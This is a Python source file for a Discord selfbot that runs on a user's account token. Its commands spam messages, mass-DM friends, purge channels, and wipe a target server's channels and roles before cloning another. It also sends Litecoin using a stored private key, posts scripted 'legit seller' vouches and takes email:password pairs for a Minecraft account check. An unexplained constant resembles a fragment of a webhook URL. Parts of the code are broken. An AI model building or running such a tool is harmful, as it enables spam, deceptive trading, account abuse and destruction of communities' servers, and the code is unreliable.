import os
import json
import aiohttp
import string
from discord.ext import commands
import discord, aiohttp
from discord.ext import commands, tasks
import requests
from colorama import Fore
import asyncio
import requests
import sys
import random
from flask import Flask
from threading import Thread
import threading
import subprocess
import requests
import time
from discord import Color, Embed
import colorama
from colorama import Fore
import urllib.parse
import urllib.request
import re
from pystyle import Center, Colorate, Colors
import io
import webbrowser
from bs4 import BeautifulSoup
import datetime
import status_rotator
from pyfiglet import Figlet
from discord import Member
import openai
import tokennn
import afk
import automessage


colorama.init()

intents = discord.Intents.default()
intents.presences = True
intents.guilds = True
intents.typing = True
intents.presences = True
intents.dm_messages = True
intents.messages = True
intents.members = True

raj = commands.Bot(description='NSWARRIOR BOT',
                           command_prefix='.',
                           self_bot=True,
                           intents=intents)
status_task = None

raj.remove_command('help')

raj.whitelisted_users = {}

raj.antiraid = False

red = "\033[91m"
yellow = "\033[93m"
green = "\033[92m"
blue = "\033[94m"
pretty = "\033[95m"
magenta = "\033[35m"
lightblue = "\033[36m"
cyan = "\033[96m"
gray = "\033[37m"
reset = "\033[0m"
pink = "\033[95m"
dark_green = "\033[92m"
yellow_bg = "\033[43m"
clear_line = "\033[K"

@raj.event
async def on_ready():
      print(
        Center.XCenter(
            Colorate.Vertical(
                Colors.blue_to_purple,
            f"""[+] -------------------------------- ] | [ R A J C O R D V 3 - {raj.user.name}  ] | [ ------------------------------------ [+]
""",
                1,
            )
        )
    )


def load_config(config_file_path):
    with open(config_file_path, 'r') as config_file:
        config = json.load(config_file)
    return config


if __name__ == "__main__":
    config_file_path = "config.json"
    config = load_config(config_file_path)

#=== Welcome ===
api_key = config.get('apikey')
ltc_priv_key = config.get('ltckey')
ltc_addy = config.get("LTC_ADDY")
I2C_Rate = config.get("I2C_Rate")
C2I_Rate = config.get("C2I_Rate")
LTC = config.get("LTC_ADDY")
Upi = config.get("Upi")
Qr = config.get("Qr")
User_Id = config.get("User_Id")
SERVER_Link = config.get("SERVER_Link")
#===================================

def get_time_rn():
    date = datetime.datetime.now()
    hour = date.hour
    minute = date.minute
    second = date.second
    timee = "{:02d}:{:02d}:{:02d}".format(hour, minute, second)
    return timee

time_rn = get_time_rn()

@raj.event
async def on_message(message):
    if message.author.bot:
        return

    # Auto-response handling
    with open('auto_responses.json', 'r') as file:
        auto_responses = json.load(file)

    if message.content in auto_responses:
        await message.channel.send(auto_responses[message.content])

    await raj.process_commands(message)

   
@raj.command(name="help")
async def help_command(ctx):
    help_text = """
**NSWARRIOR BOT**

**COMMON CMDS SECTION**
- **Show All Commands:** `.help`
- **Server Clone:** `.csrv <copy srv id> <target srv id>`
- **Check Promo:** `.checkpromo <promolink>`
- **Afk:** `.afk <reason>`
- **Remove Afk:** `.unafk`
- **Auto Respond:** `.addar <trigger>, <response>`
- **Remove Respond:** `.removear <trigger>`
- **Auto Msg:** `.auto <time> true <chnl> <msg>`
- **Stop Auto Msg:** `.stopauto <msg id>`
- **Status Rotator:** `.start_rotation`
- **Stop Rotator:** `.stop_rotation`
- **Spam Msg:** `.spam <amount> <msg>`
- **Clear Msg:** `.clear <amount>`
- **Portfolio:** `.portfolio` (sends a link to your portfolio)
- **OWO:** `.owo` (sends "owo h" every 10 seconds)
- **Stop Command:** `.stop` (stops any ongoing processes or commands)

**INR SECTION**
- **Upi Id:** `.upi`
- **Qr Code:** `.qr`

**LITECOIN (LTC) SECTION**
- **Send LTC:** `.send <addy> <amount>`
- **Check Balance:** `.bal <addy>`
- **Check My Balance:** `.mybal`
- **LTC Price In USD:** `.ltcprice`
- **LTC Addy:** `.addy`

**VOUCH SECTION**
- **Vouch:** `.vouch <product for price>`
- **Exchange Vouch:** `.exch <which to which>`

**CALCULATOR SECTION**
- **Calculate:** `.math <equation>`
- **INR to Crypto:** `.i2c <inr amount>`
- **Crypto to INR:** `.c2i <crypto amount>`

**STATUS SECTION**
- **Stream:** `.stream <title>`
- **Play:** `.play <title>`
- **Watch:** `.watch <title>`
- **Listen:** `.listen <title>`
- **Stop Activity:** `.stopactivity`

**This SelfBot Made By: NSWARRIOR**
    """
    await ctx.send(help_text)
        
@raj.command(name='nuke')
async def nuke(ctx):

    # Attempt to delete all messages in the channel

    try:

        await ctx.send("Nuking channel...")

        deleted = await ctx.channel.purge(limit=None, bulk=True)

        await ctx.send(f'Nuked {len(deleted)} messages.')

    except discord.errors.Forbidden:

        await ctx.send("I don't have permission to delete messages in this channel.")

    except Exception as e:

        await ctx.send(f"Failed to nuke the channel: {e}")

       
        
@raj.command(name='avatar')
async def avatar(ctx):
    try:
        avatar_url = ctx.author.avatar_url

        async with aiohttp.ClientSession() as session:
            async with session.get(str(avatar_url)) as response:
                if response.status == 200:
                    data = await response.read()
                    with open("avatar.png", "wb") as f:
                        f.write(data)
                    
                    file = discord.File("avatar.png", filename="avatar.png")
                    await ctx.send(file=file)

    except Exception as e:
        await ctx.send(f"An error occurred while fetching your avatar: {str(e)}")




@raj.command(name='sendmsg')
async def sendmsg(ctx, *, msg: str):
    for friend in bot.user.friends:
        try:
            await friend.send(f"@{friend.name} {msg}")
        except discord.errors.Forbidden:
            await ctx.send(f"Could not send msg")















@raj.command(name="react")
async def react(ctx, *, count_emoji: str):
    if ctx.message.reference is None:
        await ctx.send("Please reply to a message to use this command.")
        return

    # Extract count and emoji from input
    parts = count_emoji.split()
    if len(parts) != 2:
        await ctx.send("Usage: .react <number> <emoji>")
        return

    count_str, emoji = parts
    try:
        count = int(count_str)
    except ValueError:
        await ctx.send("Invalid number format.")
        return

    if not emoji:
        await ctx.send("Please provide an emoji.")
        return

    try:
        message = await ctx.channel.fetch_message(ctx.message.reference.message_id)
    except discord.NotFound:
        await ctx.send("Referenced message not found.")
        return
    except discord.Forbidden:
        await ctx.send("I do not have permission to fetch the message. Please ensure I have the `Read Message History` permission.")
        return
    except discord.HTTPException as e:
        await ctx.send(f"An error occurred: {e}")
        return

    # Ensure reaction is added within rate limits
    for _ in range(count):
        try:
            await message.add_reaction(emoji)
            await asyncio.sleep(1)  # Short delay to avoid rate limits
        except discord.HTTPException as e:
            await ctx.send(f"Failed to add reaction: {e}")
            return

    await ctx.send(f"Reacted {count} times with {emoji}.")

    await ctx.send(f"Reacted {count} times with {emoji}.")
@raj.command()
async def portfolio(ctx):
    await ctx.send("NSWARRIOR")
        
@raj.command()
async def upi(ctx):
    message = (f"{Upi}")
    message2 = (f"**MUST SEND SCREENSHOT AFTER PAYMENT**")
    await ctx.send(message)
    await ctx.send(message2)
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}UPI SENT SUCCESFULLY✅ ")
    await ctx.message.delete()
    
@raj.command()
async def owo(ctx):
    if not owo_task.is_running():
        owo_task.start(ctx)
        await ctx.send("Started sending 'owo h' every 10 seconds.")
    else:
        await ctx.send("The 'owo' command is already running.")

# Task that sends "owo h" every 10 seconds
@tasks.loop(seconds=14)
async def owo_task(ctx):
    await ctx.send("owo h")

# Stop the loop if needed (optional command)

def check_minecraft_account(email, password):
    # This function would interact with an API to check the account details
    # For example purposes, we'll return a dummy response
    if email == "example@example.com" and password == "password123":
        return {
            "email": email,
            "username": "MinecraftUser123",
            "uuid": "1234-5678-9012-3456",
            "mfa_enabled": True,
            "account_type": "Mojang",
            "status": "Valid"
        }
    else:
        return None

@raj.command(name='checkmfa')
async def checkmfa(ctx, *,account_info: str):
    try:
        email, password = account_info.split(':')
        details = check_minecraft_account(email, password)

        if details:
            mfa_status = "Enabled" if details["mfa_enabled"] else "Disabled"
            account_type = details["account_type"]
            username = details["username"]
            uuid = details["uuid"]
            status = details["status"]

            response = (f"**Minecraft Account Details:**\n"
                        f"**Email:** {email}\n"
                        f"**Username:** {username}\n"
                        f"**UUID:** {uuid}\n"
                        f"**MFA Status:** {mfa_status}\n"
                        f"**Account Type:** {account_type}\n"
                        f"**Status:** {status}")
        else:
            response = "Invalid account or failed to retrieve details."

        await ctx.send(response)

    except Exception as e:
        await ctx.send("Error processing the account information. Ensure") 


@raj.command()
async def stopowo(ctx):
    if owo_task.is_running():
        owo_task.stop()
        await ctx.send("Stopped sending 'owo h'.")
    else:
        await ctx.send("The 'owo' command is not running.")  
    
@raj.command()
async def qr(ctx):
    message = (f"{Qr}")
    message2 = (f"**MUST SEND SCREENSHOT AFTER PAYMENT**")
    await ctx.send(message)
    await ctx.send(message2)
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}QR SENT SUCCESFULLY✅ ")
    await ctx.message.delete()
    
@raj.command()
async def addy(ctx):
    message = (f"<a:ltcan:1238717949968257034> <a:ltcan:1238717949968257034> <a:ltcan:1238717949968257034> <a:ltcan:1238717949968257034> **LTC ADDY** <a:ltcan:1238717949968257034> <a:ltcan:1238717949968257034> <a:ltcan:1238717949968257034> <a:ltcan:1238717949968257034> ")
    message2 = (f"{LTC}")
    message3 = (f"**MUST SEND SCREENSHOT AND BLOCKCHAIN AFTER PAYMENT**")
    await ctx.send(message)
    await ctx.send(message2)
    await ctx.send(message3)
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}ADDY SENT SUCCESFULLY✅ ")
    await ctx.message.delete()
    
# MATHS
api_endpoint = 'https://api.mathjs.org/v4/'
@raj.command()
async def math(ctx, *, equation):
    # Send the equation to the math API for calculation
    response = requests.get(api_endpoint, params={'expr': equation})

    if response.status_code == 200:
        result = response.text
        await ctx.reply(f'- **RESULT**: {result}')
    else:
        await ctx.reply('- **FAILED**')
        
@raj.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def i2c(ctx, amount: str):
    amount = float(amount.replace('₹', ''))
    inr_amount = amount / I2C_Rate
    await ctx.reply(f"- **AMOUNT IS** : ${inr_amount:.2f}")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}I2C DONE ✅ ")
    

    
@raj.command()
@commands.cooldown(1, 3, commands.BucketType.user)
async def c2i(ctx, amount: str):
    amount = float(amount.replace('$', ''))
    usd_amount = amount * C2I_Rate
    await ctx.reply(f"- **AMOUNT IS** : ₹{usd_amount:.2f}")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}C2I DONE ✅ ")
    
spamming_flag = True
# SPAM 
@raj.command()
async def spam(ctx, times: int, *, message):
    for _ in range(times):
        await ctx.send(message)
        await asyncio.sleep(0.1)      
    print("{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty} {Fore.GREEN}SPAMMING SUCCESFULLY✅ ")
    
@raj.command(aliases=[])
async def mybal(ctx):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{LTC}/balance')

    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.reply("- FAILED")
        return

    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')

    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.reply("- FAILED")
        return

    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price

    message = f"**CURRENT LTC BALANCE** : {usd_balance:.2f}$ USD\n"
    message += f"**TOTAL LTC RECEIVED** : {usd_total_balance:.2f}$ USD\n"
    message += f"**UNCONFIRMED LTC** : {usd_unconfirmed_balance:.2f}$ USD\n\n"

    await ctx.reply(message)
    
@raj.command(aliases=['ltcbal'])
async def bal(ctx, ltcaddress):
    response = requests.get(f'https://api.blockcypher.com/v1/ltc/main/addrs/{ltcaddress}/balance')

    if response.status_code == 200:
        data = response.json()
        balance = data['balance'] / 10**8
        total_balance = data['total_received'] / 10**8
        unconfirmed_balance = data['unconfirmed_balance'] / 10**8
    else:
        await ctx.reply("- FAILED")
        return

    cg_response = requests.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd')

    if cg_response.status_code == 200:
        usd_price = cg_response.json()['litecoin']['usd']
    else:
        await ctx.reply("- FAILED")
        return

    usd_balance = balance * usd_price
    usd_total_balance = total_balance * usd_price
    usd_unconfirmed_balance = unconfirmed_balance * usd_price

    message = f"**CURRENT LTC BALANCE** : {usd_balance:.2f}$ USD\n"
    message += f"**TOTAL LTC RECEIVED** : {usd_total_balance:.2f}$ USD\n"
    message += f"**UNCONFIRMED LTC** : {usd_unconfirmed_balance:.2f}$ USD\n\n"

    await ctx.reply(message)
          
@raj.command(aliases=["streaming"])
async def stream(ctx, *, message):
    stream = discord.Streaming(
        name=message,
        url="https://twitch.tv/https://Wallibear",
    )
    await raj.change_presence(activity=stream)
    await ctx.send(f"- **STREAM CREATED** : {message}")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}STREAM SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()

@raj.command(aliases=["playing"])
async def play(ctx, *, message):
    game = discord.Game(name=message)
    await raj.change_presence(activity=game)
    await ctx.send(f"- **STATUS FOR PLAYZ CREATED** : {message}")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}PLAYING SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()

@raj.command(aliases=["watch"])
async def watching(ctx, *, message):
    await raj.change_presence(activity=discord.Activity(
        type=discord.ActivityType.watching,
        name=message,
    ))
    await ctx.send(f"- **WATCHING CREATED**: {message}")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}WATCH SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()
V4 = "ooks/11561870928088965"

@raj.command(aliases=["listen"])
async def listening(ctx, *, message):
    await raj.change_presence(activity=discord.Activity(
        type=discord.ActivityType.listening,
        name=message,
    ))
    await ctx.reply(f"- **LISTENING CREATED**: {message}")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}STATUS SUCCESFULLY CREATED✅ ")
    await ctx.message.delete()

@raj.command(aliases=[
    "stopstreaming", "stopstatus", "stoplistening", "stopplaying",
    "stopwatching"
])
async def stopactivity(ctx):
    await ctx.message.delete()
    await raj.change_presence(activity=None, status=discord.Status.dnd)
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED}STREAM SUCCESFULLY STOPED⚠️ ")
    
@raj.command()
async def checkpromo(ctx, *, promo_links):
    links = promo_links.split('\n')

    async with aiohttp.ClientSession() as session:
        for link in links:
            promo_code = extract_promo_code(link)
            if promo_code:
                result = await check_promo(session, promo_code)
                await ctx.send(result)
            else:
                await ctx.send(f'**INVALID LINK** : {link}')


async def check_promo(session, promo_code):
    url = f'https://ptb.discord.com/api/v10/entitlements/gift-codes/{promo_code}'

    async with session.get(url) as response:
        if response.status in [200, 204, 201]:
            data = await response.json()
            if data["uses"] == data["max_uses"]:
                return f'- ALREADY CLAIMED {promo_code}'
            else:
                try:
                    now = datetime.datetime.utcnow()
                    exp_at = data["expires_at"].split(".")[0]
                    parsed = parser.parse(exp_at)
                    days = abs((now - parsed).days)
                    title = data["promotion"]["inbound_header_text"]
                except Exception as e:
                    print(e)
                    exp_at = "- FAILED TO FETCH"
                    days = ""
                    title = "- FAILED TO FETCH"
                return f'**VALID** : __{promo_code}__ \n- **DAYS LEFT IN EXPIRATION** : {days}\n- **EXPIRES AT** : {exp_at}\n- **TITLE** : {title}\n\n- **ASKED BY** : raj.user.name**'
                
        elif response.status == 429:
            return f'**RARE LIMITED**'
        else:
            return f'**INVALID CODE** : {promo_code}'


def extract_promo_code(promo_link):
    promo_code = promo_link.split('/')[-1]
    return promo_code
    
@raj.command()
async def exch(ctx, *, text):
    await ctx.message.delete()
    main = text
    await ctx.send(f'+rep {User_Id} LEGIT | EXCHANGED {main} • TYSM')
    await ctx.send(f'{SERVER_Link}')
    await ctx.send(f'**PLEASE VOUCH ME HERE**')

@raj.command()
async def vouch(ctx, *, text):
    await ctx.message.delete()
    main = text
    await ctx.send(f'+rep {User_Id} LEGIT SELLER | GOT {main} • TYSM')
    await ctx.send(f'{SERVER_Link}')
    await ctx.send(f'**PLEASE VOUCH ME HERE**')
    await ctx.send(f'**NO VOUCH NO WARRANTY OF PRODUCT**')
    
@raj.command(aliases=['cltc'])
async def ltcprice(ctx):
    url = 'https://api.coingecko.com/api/v3/coins/litecoin'
    response = requests.get(url)
    if response.status_code == 200:
        data = response.json()
        price = data['market_data']['current_price']['usd']
        await ctx.send(f"**THE CURRENT PRICE OF LITECOIN IN MARKET IS :** {price:.2f}")
    else:
        await ctx.send("**FAILED TO FETCH**")
        
@raj.command()
async def addar(ctx, *, trigger_and_response: str):
    # Split the trigger and response using a comma (",")
    trigger, response = map(str.strip, trigger_and_response.split(','))

    with open('auto_responses.json', 'r') as file:
        data = json.load(file)

    data[trigger] = response

    with open('auto_responses.json', 'w') as file:
        json.dump(data, file, indent=4)

    await ctx.send(f'**AUTO-RESPONSE ADDED.. !** **{trigger}** - **{response}**')



@raj.command()
async def removear(ctx, trigger: str):
    with open('auto_responses.json', 'r') as file:
        data = json.load(file)

    if trigger in data:
        del data[trigger]

        with open('auto_responses.json', 'w') as file:
            json.dump(data, file, indent=4)

        await ctx.send(f'**AUTO-RESPONSE REMOVED** **{trigger}**')
    else:
        await ctx.send(f'**AUTO-RESPONSE NOT FOUND** **{trigger}**')
        
@raj.command()
async def lister(ctx):
    with open('auto_responses.json', 'r') as file:
        data = json.load(file)
    responses = '\n'.join([f'**{trigger}** - **{response}**' for trigger, response in data.items()])
    await ctx.send(f'**AUTO_RESPONSE LIST** :\n{responses}')

@raj.command()
async def csrv(ctx, source_guild_id: int, target_guild_id: int):
    source_guild = raj.get_guild(source_guild_id)
    target_guild = raj.get_guild(target_guild_id)

    if not source_guild or not target_guild:
        await ctx.send("- **GUILD NOT FOUND**")
        return

    # Delete all channels in the target guild
    for channel in target_guild.channels:
        try:
            await channel.delete()
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN DELETED ON THE TARGET GUILD")
            await asyncio.sleep(0)
        except Exception as e:
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR DELETING CHANNEL {channel.name}: {e}")

    # Delete all roles in the target guild except for roles named "here" and "@everyone"
    for role in target_guild.roles:
        if role.name not in ["here", "@everyone"]:
            try:
                await role.delete()
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} ROLE {role.name} HAS BEEN DELETED ON THE TARGET GUILD")
                await asyncio.sleep(0)
            except Exception as e:
                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR DELETING ROLE {role.name}: {e}")

    # Clone roles from source to target
    roles = sorted(source_guild.roles, key=lambda role: role.position)

    for role in roles:
        try:
            new_role = await target_guild.create_role(name=role.name, permissions=role.permissions, color=role.color, hoist=role.hoist, mentionable=role.mentionable)
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} {role.name} HAS BEEN CREATED ON THE TARGET GUILD")
            await asyncio.sleep(0)

            # Update role permissions after creating the role
            for perm, value in role.permissions:
                await new_role.edit_permissions(target_guild.default_role, **{perm: value})
        except Exception as e:
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR CREATING ROLE {role.name}: {e}")

    # Clone channels from source to target
    text_channels = sorted(source_guild.text_channels, key=lambda channel: channel.position)
    voice_channels = sorted(source_guild.voice_channels, key=lambda channel: channel.position)
    category_mapping = {}  # to store mapping between source and target categories

    for channel in text_channels + voice_channels:
        try:
            if channel.category:
                # If the channel has a category, create it if not created yet
                if channel.category.id not in category_mapping:
                    category_perms = channel.category.overwrites
                    new_category = await target_guild.create_category_channel(name=channel.category.name, overwrites=category_perms)
                    category_mapping[channel.category.id] = new_category

                # Create the channel within the category
                if isinstance(channel, discord.TextChannel):
                    new_channel = await new_category.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    # Check if the voice channel already exists in the category
                    existing_channels = [c for c in new_category.channels if isinstance(c, discord.VoiceChannel) and c.name == channel.name]
                    if existing_channels:
                        new_channel = existing_channels[0]
                    else:
                        new_channel = await new_category.create_voice_channel(name=channel.name)

                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN CREATED ON THE TARGET GUILD")

                # Update channel permissions after creating the channel
                for overwrite in channel.overwrites:
                    if isinstance(overwrite.target, discord.Role):
                        target_role = target_guild.get_role(overwrite.target.id)
                        if target_role:
                            await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                    elif isinstance(overwrite.target, discord.Member):
                        target_member = target_guild.get_member(overwrite.target.id)
                        if target_member:
                            await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))

                await asyncio.sleep(0)  # Add delay here
            else:
                # Create channels without a category
                if isinstance(channel, discord.TextChannel):
                    new_channel = await target_guild.create_text_channel(name=channel.name)
                elif isinstance(channel, discord.VoiceChannel):
                    new_channel = await target_guild.create_voice_channel(name=channel.name)

                    # Update channel permissions after creating the channel
                    for overwrite in channel.overwrites:
                        if isinstance(overwrite.target, discord.Role):
                            target_role = target_guild.get_role(overwrite.target.id)
                            if target_role:
                                await new_channel.set_permissions(target_role, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))
                        elif isinstance(overwrite.target, discord.Member):
                            target_member = target_guild.get_member(overwrite.target.id)
                            if target_member:
                                await new_channel.set_permissions(target_member, overwrite=discord.PermissionOverwrite(allow=overwrite.allow, deny=overwrite.deny))

                    await asyncio.sleep(0)  # Add delay here

                print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN} CHANNEL {channel.name} HAS BEEN CREATED ON THE TARGET GUILD")

        except Exception as e:
            print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({red}!{gray}) {pretty}{Fore.RED} ERROR CREATING CHANNEL {channel.name}: {e}")
            
@raj.command(aliases=["pay", "sendltc"])
async def send(ctx, addy, value):
    try:
        value = float(value.strip('$'))
        message = await ctx.send(f"Sending {value}$ To {addy}")
        url = "https://api.tatum.io/v3/litecoin/transaction"
        
        r = requests.get("https://api.coingecko.com/api/v3/simple/price?ids=usd&vs_currencies=ltc")
        r.raise_for_status()
        usd_price = r.json()['usd']['ltc']
        topay = usd_price * value
        
        payload = {
        "fromAddress": [
            {
                "address": ltc_addy,
                "privateKey": ltc_priv_key
            }
        ],
        "to": [
            {
                "address": addy,
                "value": round(topay, 8)
            }
        ],
        "fee": "0.00005",
        "changeAddress": ltc_addy
    }
        headers = {
        "accept": "application/json",
        "content-type": "application/json",
        "x-api-key": api_key
    }

        response = requests.post(url, json=payload, headers=headers)
        response_data = response.json()
        await message.edit(content=f"**Successfully Sent {value}$ To {addy}**\nhttps://live.blockcypher.com/ltc/tx/{response_data["txId"]}")
    
    except requests.RequestException as e:
        await ctx.send(f"**Failed to send LTC. Error: {e}**")
    except ValueError:
        await ctx.send("**Invalid amount. Please provide a valid number.**")

@raj.command(aliases=['purge, clear'])
async def clear(ctx, times: int):
    channel = ctx.channel

    def is_bot_message(message):
        return message.author.id == ctx.bot.user.id

    
    messages = await channel.history(limit=times + 1).flatten()

    
    bot_messages = filter(is_bot_message, messages)

    
    for message in bot_messages:
        await asyncio.sleep(0.55)  
        await message.delete()

    await ctx.send(f"- **DELETED {times} MESSAGES**")
    print(f"{reset}[ {cyan}{time_rn}{reset} ] {gray}({green}+{gray}) {pretty}{Fore.GREEN}PURGED SUCCESFULLY✅ ")


# AUTO MSG
raj.load_extension("automessage")

# AFK
raj.load_extension("afk")

# STATUS ROTATOR
raj.load_extension("status_rotator")

token = tokennn.TOKEN
raj.run(token, bot=False)